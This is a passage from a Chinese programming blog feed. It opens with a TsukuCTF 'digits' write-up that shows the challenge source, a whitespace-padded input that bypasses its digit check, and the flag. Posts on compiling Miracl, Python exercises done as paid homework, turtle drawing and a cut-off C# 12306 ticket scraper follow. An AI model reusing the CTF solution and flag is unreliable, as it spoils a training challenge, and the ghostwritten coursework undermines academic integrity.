<h1 id="digits"><a href="#digits" class="headerlink" title="digits"></a>digits</h1><p><em>コンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。</em><br><em><a href="https://tsukuctf.sechack365.com/problems/digits">https://tsukuctf.sechack365.com/problems/digits</a></em></p>
<hr>
<p>访问<code>problems/digits</code>:</p>
<pre><code class="json">&#123;
    &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
&#125;
</code></pre>
<p>题目给了源码：</p>
<pre><code class="python">from typing import Optional
from fastapi import FastAPI
import random

app = FastAPI()
FLAG = &quot;TsukuCTF&#123;&#125;&quot;

@app.get(&quot;/&quot;)
def main(q: Optional[str] = None):
    print(q)
    if q == None:
        return &#123;
            &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;
        &#125;
    if len(q) != 10:
        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
    if &quot;-&quot; in q or &quot;+&quot; in q:
        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
    try:
        if not type(int(q)) is int:
            return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;
    except:
        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;

    you_are_lucky = 0

    for _ in range(100):
        idx = random.randrange(4)
        if q[idx] &lt; &quot;0&quot;:
            you_are_lucky += 1
        if q[idx] &gt; &quot;9&quot;:
            you_are_lucky += 1

    if you_are_lucky &gt; 0:
        return &#123;&quot;flag&quot;: FLAG&#125;
    else:
        return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125;
</code></pre>
<p>要求找到查询参数q的值，满足:</p>
<ul>
<li><code>q != None</code></li>
<li><code>len(q) == 10</code></li>
<li>不包含<code>-</code>和<code>+</code></li>
<li>可以使用<code>int(q)</code>进行转换</li>
<li>至少包含一个0-9之外的字符</li>
</ul>
<p><code>python</code>中使用<code>int</code>进行强制类型转换时会忽略两侧的空格，提交<code>q=   4567890</code>即可</p>
<pre><code class="json">&#123;
    &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot;
&#125;
</code></pre>
<p><strong>flag:</strong><code>TsukuCTF&#123;you_are_lucky_Tsukushi&#125; </code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TsukuCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下编译Miracl密码库</title>
    <url>/posts/2543483413/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。</p>
<h1 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h1><ul>
<li><a href="http://www.codeblocks.org/downloads">CodeBlocks</a></li>
<li><a href="https://gitforwindows.org/">Git Bash</a><span id="more"></span></li>
</ul>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><ol>
<li>从Github上下载项目最新源码。(<a href="https://github.com/miracl/MIRACL/archive/master.zip">下载地址</a>)</li>
<li>打开Git Bash,创建一个文件夹<code>miracl</code>，并将压缩文件拷贝至此。<br><code>mkdir miracl</code></li>
<li>打开Git Bash，输入如下命令，将所有文件解压到一个目录中。<br><code>unzip -j -aa -L master.zip</code></li>
<li>编辑<code>gcdoit.bat</code>，注释掉最后几行并保存。<img data-src="/posts/2543483413/pasted-1.png" class=""></li>
<li>执行<code>gcdoit.bat</code>,生成的<code>miracl.a</code>即为编译好的库。</li>
</ol>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><ol>
<li><p>打开CodeBlocks，新建Console application项目。</p>
<img data-src="/posts/2543483413/pasted-2.png" class=""></li>
<li><p>将<code>mirdef.h</code>、<code>miracl.h</code>、<code>miracl.a</code>拷贝至项目根目录。</p>
</li>
<li><p>对着CB左侧工作空间中的项目名右键，点击添加文件,将上述三个文件添加至项目中。</p>
<img data-src="/posts/2543483413/pasted-3.png" class=""></li>
<li><p>CB会弹出如下错误提示,莫慌.</p>
<img data-src="/posts/2543483413/error.png" class=""></li>
<li><p>对着CB左侧工作空间中的项目名右键,点击生成选项,修改链接器设置.</p>
<img data-src="/posts/2543483413/pasted-4.png" class="">
<div class="note warning">
            <p>环境设置选择: 仅使用项目选项</p>
          </div></li>
<li><p>在<code>main.c</code>中输入如下代码，进行测试。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;miracl.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    big x,y,z;</span><br><span class="line">    miracl *mip = <span class="built_in">mirsys</span>(<span class="number">1000</span>, <span class="number">16</span>);</span><br><span class="line">    x= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    y= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    z= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,x);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,y);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,z);</span><br><span class="line">    <span class="built_in">add</span>(x,y, z);</span><br><span class="line">    <span class="built_in">cotnum</span>(z,stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>点击CB中的生成并运行按钮，如图所示。</p>
<img data-src="/posts/2543483413/pasted-5.png" class="" title="运行结果图">
</li>
<li><p>gcc编译命令为:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc filename.c miracl.a -o filename</span><br><span class="line">./filename.exe</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://www.cnblogs.com/little-kwy/p/12285955.html">树莓派下编译并使用miracl密码库</a></li>
<li><a href="https://blog.csdn.net/joker_clown/article/details/83662846">win10+gcc+miracl</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Miracl</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>人生苦短，我用Python</title>
    <url>/posts/2604890615/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几日代写留学生作业时遇到了两道很有意思的Python编程题，在此做一记录，主要涉及到一些Python的高级特性:生成器、lambda表达式。</p>
<span id="more"></span>

<h1 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h1><h2 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h2><p><strong>原文:</strong><br>Consider the following function</p>
<div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># listOfNumbers is a list of only numbers</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">processList</span>(<span class="params">listOfNumbers</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listOfNumbers:</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="number">0</span> == <span class="number">0</span>:</span><br><span class="line">            result.append(i*i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append((i*i)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
    </div>
</div>

<p>First, study and test processList(listOfNumbers) to determine what it does Then rewrite its body so that it accomplishes the same task with a one-line list comprehension. Thus, the resulting function will have exactly two lines, the def line and a return line containing a list comprehension expression.<br><strong>翻译:</strong><br>将给出的一个函数变成两行</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>函数的功能是:遍历listofNumbers中的每一个元素，如果大于等于0，将其变成自己乘以自己，否则变为自己乘自己后再加一。<br>因此，我们可以用到Python中的三元表达式，下面这两种方式是等价的。<br><code>value = true if condition else false</code><br>与</p>
<div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    value = true</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    value = false</span><br></pre></td></tr></table></figure>
    </div>
</div>

<h2 id="参考答案"><a href="#参考答案" class="headerlink" title="参考答案"></a>参考答案</h2><div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">processList</span>(<span class="params">listOfNumbers</span>):</span><br><span class="line">    <span class="keyword">return</span> [i * i <span class="keyword">if</span> i &gt;= <span class="number">0</span> <span class="keyword">else</span> i * i + <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> listOfNumbers]</span><br></pre></td></tr></table></figure>
    </div>
</div>

<h1 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h1><h2 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h2><p><strong>原文:</strong><br>Implement function processList2(inputList, specialItem, ignoreItems) that returns a new list that contains all the items of inputList (and in the original order) except 1) any that appear in the list ignoreItems, and 2) occurrences of specialItem (if specialItem is not in ignoreItems) should become the string &quot;special&quot; in the new list. Use a one-line list cluoomprehension to construct the new list. Thus, again, the function will have exactly two lines, the def line and a return line containing a list comprehension expression. For example,</p>
<div class="note default no-icon">
            <p>processList2([1,2,3,4], 4, [3])<br>[1, 2, &#39;special&#39;]<br>processList2([1,2,3,4,True,&#39;dog&#39;], 4, [3,5,4])<br>[1, 2, True, &#39;dog&#39;]<br>processList2([1,1,2,2], 1, [2])<br>[&#39;special&#39;, &#39;special&#39;]</p>
          </div>
<p><strong>翻译:</strong><br>实现函数processList2(inputList, specialItem, ignoreItems)，对inputList中的元素进行处理，返回一个新列表，但需满足以下两个要求:</p>
<ol>
<li>不能是出现在ignoreItems中的元素</li>
<li>对于与specialItem相同的元素(不能在ignoreItems中出现)，将其变成&quot;special&quot;。</li>
</ol>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><ol>
<li>首先将不在ignoreItems中的那些元素筛出来<code>[x for x in inputList if x not in ignoreItems]</code>或<code>list(filter(lambda x:False if x in ignoreItems else True,inputList))</code>。</li>
<li>然后遍历上述列表中的元素，将specialItem变成&quot;special&quot;,<code>[&quot;special&quot; if x == specialItem else x for x in xxx]</code></li>
</ol>
<h2 id="参考答案-1"><a href="#参考答案-1" class="headerlink" title="参考答案"></a>参考答案</h2><div class='spoiler collapsed'>
    <div class='spoiler-title'>
        Code
    </div>
    <div class='spoiler-content'>
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">processList2</span>(<span class="params">inputList, specialItem, ignoreItems</span>):</span><br><span class="line">    <span class="comment">## two method</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&quot;special&quot;</span> <span class="keyword">if</span> x == specialItem <span class="keyword">else</span> x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:<span class="literal">False</span> <span class="keyword">if</span> x <span class="keyword">in</span> ignoreItems <span class="keyword">else</span> <span class="literal">True</span>,inputList))]</span><br><span class="line">    <span class="keyword">return</span>[<span class="string">&quot;special&quot;</span> <span class="keyword">if</span> x == specialItem <span class="keyword">else</span> x <span class="keyword">for</span> x <span class="keyword">in</span> [x <span class="keyword">for</span> x <span class="keyword">in</span> inputList <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> ignoreItems]]</span><br></pre></td></tr></table></figure>
    </div>
</div>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="http://www.runoob.com/python3/python3-func-filter.html">filter() 函数</a></li>
<li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431779637539089fd627094a43a8a7c77e6102e3a811000">列表生成式</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>lambda</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Python画小树和森林（宽度优先绘制+深度优先绘制)</title>
    <url>/posts/15900/</url>
    <content><![CDATA[<p>在中M上看嵩天老师的<a href="http://www.icourse163.org/learn/BIT-268001">《Python语言程序设计》</a>时,视频中给出了宽度优先绘制法的代码,仅提了一下还有另外一种画法(深度优先绘制法).联系到最近学的数据结构，摸索出了另一种画法。</p>
<span id="more"></span>
<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 2, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># drawtree.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> Turtle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">plist, l, a, f</span>):</span><br><span class="line">    <span class="comment">#宽度优先绘制法</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; plist is list of pens</span></span><br><span class="line"><span class="string">    l is length of branch</span></span><br><span class="line"><span class="string">    a is half of the angle between 2 branches</span></span><br><span class="line"><span class="string">    f is factor by which branch is shortened</span></span><br><span class="line"><span class="string">    from level to level.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> l &gt; <span class="number">5</span>:</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> plist:</span><br><span class="line">            p.forward(l)<span class="comment">#Move the turtle forward by the specified distance, in the direction the turtle is headed.</span></span><br><span class="line">            q = p.clone()<span class="comment">#Create and return a clone of the turtle with same position, heading and turtle properties.</span></span><br><span class="line">            p.left(a) <span class="comment">#Turn turtle left by angle units</span></span><br><span class="line">            q.right(a)<span class="comment"># turn turtle right by angle units, nits are by default degrees, but can be set via the degrees() and radians() functions.</span></span><br><span class="line">            lst.append(p)</span><br><span class="line">            lst.append(q)</span><br><span class="line">        tree(lst, l*f, a, f)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree2</span>(<span class="params">p,l,a,f</span>):</span><br><span class="line">    <span class="comment">#深度优先绘制法</span></span><br><span class="line">    <span class="keyword">if</span> l&gt;<span class="number">5</span>:</span><br><span class="line">        p.forward(l)</span><br><span class="line">        q=p.clone()</span><br><span class="line">        p.left(a)</span><br><span class="line">        q.right(a)</span><br><span class="line">        tree2(p, l*f, a, f)</span><br><span class="line">        tree2(q, l*f, a, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maketree</span>(<span class="params">x,y</span>):     </span><br><span class="line">    p = Turtle()</span><br><span class="line">    p.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">    p.pensize(<span class="number">5</span>)</span><br><span class="line">    p.setundobuffer(<span class="literal">None</span>)</span><br><span class="line">    p.hideturtle() </span><br><span class="line">    <span class="comment">#Make the turtle invisible. It’s a good idea to do this while you’re in the middle of doing some complex drawing,</span></span><br><span class="line">    <span class="comment">#because hiding the turtle speeds up the drawing observably.</span></span><br><span class="line">    <span class="comment">#p.speed(9)</span></span><br><span class="line">    p.getscreen().tracer(<span class="number">1</span>,<span class="number">0</span>)<span class="comment">#Return the TurtleScreen object the turtle is drawing on.</span></span><br><span class="line">    <span class="comment">#TurtleScreen methods can then be called for that object.</span></span><br><span class="line">    p.left(<span class="number">90</span>)<span class="comment"># Turn turtle left by angle units. direction</span></span><br><span class="line"> </span><br><span class="line">    p.penup() <span class="comment">#Pull the pen up – no drawing when moving.</span></span><br><span class="line">    p.goto(x,y)<span class="comment">#Move turtle to an absolute position. If the pen is down, draw line. Do not change the turtle’s orientation.</span></span><br><span class="line">    p.pendown()<span class="comment"># Pull the pen down – drawing when moving. </span></span><br><span class="line">    <span class="comment">#这三条语句是一个组合相当于先把笔收起来再移动到指定位置，再把笔放下开始画.否则turtle一移动就会自动的把线画出来</span></span><br><span class="line"> </span><br><span class="line">    tree([p], <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>)</span><br><span class="line">    </span><br><span class="line">    p.penup() </span><br><span class="line">    p.setheading(<span class="number">90</span>)<span class="comment">#Set the orientation of the turtle to to_angle.</span></span><br><span class="line">    p.goto(x,y)</span><br><span class="line">    p.down()</span><br><span class="line">    p.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    tree2(p, <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maketree(-<span class="number">200</span>, -<span class="number">200</span>)</span><br><span class="line">    maketree(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    maketree(<span class="number">200</span>,-<span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/20171202204712994.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>使用c#中的HttpWebRequest实现12306余票查询</title>
    <url>/posts/1797370495/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
<li>下载用于解析JSON的类库(Newtonsoft.Json.dll)(下载地址:<a href="https://archive.codeplex.com/?p=json">Newtonsoft.Json.dll</a>)；</li>
<li>在C#项目中添加对其的引用。</li>
<li>在程序中导入命名空间:<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br></pre></td></tr></table></figure>
<span id="more"></span></li>
</ol>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="API地址"><a href="#API地址" class="headerlink" title="API地址"></a>API地址</h3><p>在浏览器中打开12306主页，点击<strong>余票查询</strong>，并使用浏览器中的开发者工具，进行抓包。这里，我们查询的是2018.06.25的上海至长沙的车票信息。<br><img data-src="/images/trainticket1.jpg" alt="开发者工具抓包"><br>此时浏览器发送请求的地址为：<br><code>https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=2018-06-25&amp;leftTicketDTO.from_station=SHH&amp;leftTicketDTO.to_station=CSQ&amp;purpose_codes=ADULT</code><br>由此,我们不难分析出API地址为：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> url=<span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=&#123;0&#125;&amp;leftTicketDTO.from_station=&#123;1&#125;&amp;leftTicketDTO.to_station=&#123;2&#125;&amp;purpose_codes=&#123;3&#125;&quot;</span>;</span><br><span class="line">url=<span class="built_in">string</span>.Format(url,date,<span class="keyword">from</span>,to,id);</span><br></pre></td></tr></table></figure>
<p>其中，date代表出发日(格式为yyyy-MM-dd),from代表出发站的代码，to代表到达站的代码，id代表车票类型(成人为<code>ADULT</code>,学生为<code>OX00</code>);</p>
<h3 id="车站代码"><a href="#车站代码" class="headerlink" title="车站代码"></a>车站代码</h3><p>车站对应的代码可在此下载:<a href="https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9055">https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version&#x3D;1.9055</a><br>我们可以使用正则表达式从中提取出关键信息，并保存在一个XML文档中，便于以后的使用。</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StationNameXml</span>()</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">string</span> nowpath = Environment.CurrentDirectory;</span><br><span class="line">         <span class="keyword">if</span> (Directory.Exists(nowpath+<span class="string">&quot;/Data&quot;</span>)==<span class="literal">false</span>)</span><br><span class="line">             Directory.CreateDirectory(nowpath + <span class="string">&quot;/Data&quot;</span>);<span class="comment">//创建新路径</span></span><br><span class="line">         <span class="keyword">if</span> (File.Exists(nowpath + <span class="string">&quot;/Data/StationName.xml&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">HttpWebRequest request;</span><br><span class="line">  		HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">string</span> url=<span class="string">@&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9055&quot;</span>;</span><br><span class="line"></span><br><span class="line">         request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">         request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">         request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">         request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">         <span class="keyword">try</span></span><br><span class="line">         &#123;</span><br><span class="line">             response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">             <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">             &#123;</span><br><span class="line">                 StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                 str = sr.ReadToEnd();</span><br><span class="line">                 sr.Close();</span><br><span class="line">                 response.Close();<span class="comment">//关闭response响应流</span></span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">catch</span>(Exception e)</span><br><span class="line">         &#123;</span><br><span class="line">	Console.WriteLine(e.Message);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">string</span> pattern = <span class="string">@&quot;@\S&#123;2,5&#125;?[|](?&lt;Name&gt;\S&#123;1,8&#125;?)[|](?&lt;Code&gt;\S&#123;3,5&#125;?)[|]&quot;</span>;</span><br><span class="line">         Regex r = <span class="keyword">new</span> Regex(pattern, RegexOptions.ExplicitCapture);</span><br><span class="line"></span><br><span class="line">         XmlDocument xmldoc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">         XmlDeclaration xmldecl;</span><br><span class="line"></span><br><span class="line">         xmldecl = xmldoc.CreateXmlDeclaration(<span class="string">&quot;1.0&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>);<span class="comment">//加入XML的声明段落</span></span><br><span class="line">         xmldoc.AppendChild(xmldecl);</span><br><span class="line"></span><br><span class="line">         XmlElement root = xmldoc.CreateElement(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Dict&quot;</span>, <span class="string">&quot;&quot;</span>);<span class="comment">//加入一个根元素</span></span><br><span class="line">         xmldoc.AppendChild(root);</span><br><span class="line"></span><br><span class="line">         MatchCollection mc = r.Matches(str);</span><br><span class="line">         <span class="keyword">foreach</span> (Match m <span class="keyword">in</span> mc)</span><br><span class="line">         &#123;</span><br><span class="line">             GroupCollection <span class="keyword">group</span> = m.Groups;</span><br><span class="line">             XmlNode node = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Pair&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">             XmlNode temp = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Station&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">             temp.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Name&quot;</span>].Value; </span><br><span class="line">             node.AppendChild(temp);</span><br><span class="line"></span><br><span class="line">             XmlNode temp2 = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Code&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">             temp2.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Code&quot;</span>].Value;</span><br><span class="line">             node.AppendChild(temp2);</span><br><span class="line"></span><br><span class="line">             root.AppendChild(node);</span><br><span class="line">         &#125;</span><br><span class="line">         xmldoc.Save(nowpath+<span class="string">&quot;/Data/&quot;</span>+<span class="string">&quot;StationName.xml&quot;</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="/images/trainticket2.jpg" alt="车站代码"><br>依据中文车站名获取对应车站代码的方法为:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">StationCode</span>(<span class="params"><span class="built_in">string</span> StationName</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    XmlDocument doc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">    doc.Load(Environment.CurrentDirectory + <span class="string">&quot;/Data/StationName.xml&quot;</span>);</span><br><span class="line">    XmlNodeList data = doc.DocumentElement.ChildNodes;</span><br><span class="line">    <span class="keyword">foreach</span> (XmlNode node <span class="keyword">in</span> data)</span><br><span class="line">    &#123;</span><br><span class="line">        XmlElement xe = (XmlElement)node;</span><br><span class="line">        XmlNodeList xnl0 = xe.ChildNodes;</span><br><span class="line">        <span class="built_in">string</span> s = xnl0.Item(<span class="number">0</span>).InnerText;</span><br><span class="line">        <span class="keyword">if</span>(s==StationName)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> xnl0.Item(<span class="number">1</span>).InnerText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.Empty;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><p>为了存储查询结果，我们需要构建一个车票的数据模型，具体如下；</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Ticket</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="meta">#<span class="keyword">region</span> 数据模型</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> trainid=<span class="built_in">string</span>.Empty;<span class="comment">//车次</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> fromstation = <span class="string">&quot;--&quot;</span>;<span class="comment">//出发站</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> totation = <span class="string">&quot;--&quot;</span>;<span class="comment">//到达站</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> ticketdate = <span class="built_in">string</span>.Empty;<span class="comment">//车票日期</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> starttime = <span class="string">&quot;--&quot;</span>;<span class="comment">//发车时间</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> arrivetime = <span class="string">&quot;--&quot;</span>;<span class="comment">//到达时间</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> lastedtime = <span class="string">&quot;--&quot;</span>;<span class="comment">//历时</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> tzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//特等座</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> ydNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//一等座</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> edNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//二等座</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> grwNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//高级软卧</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> rwNum = <span class="string">&quot;--&quot;</span>;<span 